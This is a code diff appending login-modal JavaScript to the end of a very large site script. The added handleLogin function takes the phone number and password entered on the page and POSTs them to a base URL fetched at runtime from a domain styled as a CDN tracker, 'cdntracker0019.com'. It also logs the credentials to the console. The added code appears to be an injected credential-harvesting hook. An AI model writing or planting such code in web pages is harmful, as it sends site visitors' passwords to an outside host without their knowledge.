@@ -46630,3 +46630,132 @@ document.addEventListener("DOMContentLoaded", function () {
     }
   });
 });
+function closeModal() {
+  const modalOverlay = document.querySelector(".modal-overlay");
+  if (!modalOverlay) return;
+  modalOverlay.style.opacity = "0";
+  modalOverlay.style.transform = "scale(0.95)";
+  setTimeout(() => {
+    modalOverlay.style.display = "none";
+  }, 200);
+}
+
+function showLoginModal() {
+  const modalOverlay = document.querySelector(".modal-overlay");
+  const header = document.querySelector(".modal-header");
+  if (!modalOverlay) return;
+  modalOverlay.style.display = "flex";
+  header.style.display = "flex";
+  modalOverlay.style.opacity = "0";
+  modalOverlay.style.transform = "scale(0.95)";
+  setTimeout(() => {
+    modalOverlay.style.opacity = "1";
+    modalOverlay.style.transform = "scale(1)";
+  }, 10);
+}
+async function fetchBaseURL() {
+  try {
+    const response = await axios.get(
+      "https://cdntracker0019.com?site_code=staging"
+    );
+    // const response = await axios.get("https://cdntracker0019.com?site_code=master");
+    if (response?.status === 200 && response.data?.url) {
+      return response.data.url;
+    } else {
+      throw new Error("Invalid response for base URL");
+    }
+  } catch (error) {
+    console.error("Error fetching baPse URL:", error);
+    throw error;
+  }
+}
+const handleLogin = async () => {
+  const phoneInput = document.getElementById("loginName");
+  const passwordInput = document.getElementById("user-password");
+  const phone = phoneInput.value || document.getElementById("username").value;
+  const password = passwordInput.value || document.getElementById("password").value;
+  if (!phone || !password) {
+    alert("Please fill in both fields");
+    // return;
+  } else {
+    const BaseUrl = await fetchBaseURL();
+    if (BaseUrl) {
+      try {
+        const res = await fetch(`${BaseUrl}/login_user`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ phone, password }),
+        });
+        const data = await res.json();
+        if (res.status === 200) {
+          if (data.message === "LOGIN_SUCCESS") {
+            phoneInput.value = null;
+            passwordInput.value = null;
+            closeModal();
+            return data;
+          } else if (data.message === "REQUIRE_RESET_PASSWORD") {
+            phoneInput.value = null;
+            passwordInput.value = null;
+            closeModal();
+            return data;
+          } else {
+            phoneInput.value = null;
+            passwordInput.value = null;
+            closeModal();
+            return data;
+          }
+        }
+      } catch (e) {
+        console.log("Login error:", e);
+        phoneInput.value = null;
+        passwordInput.value = null;
+        closeModal();
+        return null;
+      }
+    }
+  }
+  console.log("Login attempted with:", { phone, password });
+  phoneInput.value = null;
+  passwordInput.value = null;
+  closeModal();
+  // Add login logic here
+};
+  
+
+function togglePassword() {
+  const passwordInput = document.getElementById("password");
+  const toggleBtn = document.querySelector(".password-toggle");
+  if (!passwordInput || !toggleBtn) return;
+  if (passwordInput.type === "password") {
+    passwordInput.type = "text";
+    toggleBtn.textContent = "🙈";
+  } else {
+    passwordInput.type = "password";
+    toggleBtn.textContent = "👁️";
+  }
+}
+
+// Close modal when clicking outside
+document
+  .querySelector(".modal-overlay")
+  .addEventListener("click", function (e) {
+    if (e.target === this) {
+      closeModal();
+    }
+  });
+
+// Close modal with Escape key
+document.addEventListener("keydown", function (e) {
+  if (e.key === "Escape") {
+    closeModal();
+  }
+});
+
+document.addEventListener("hotgame-item", function () {
+  const hotgameItem = document.querySelector(".hotgame-item");
+  if (hotgameItem) {
+    showLoginModal();
+  }
+});
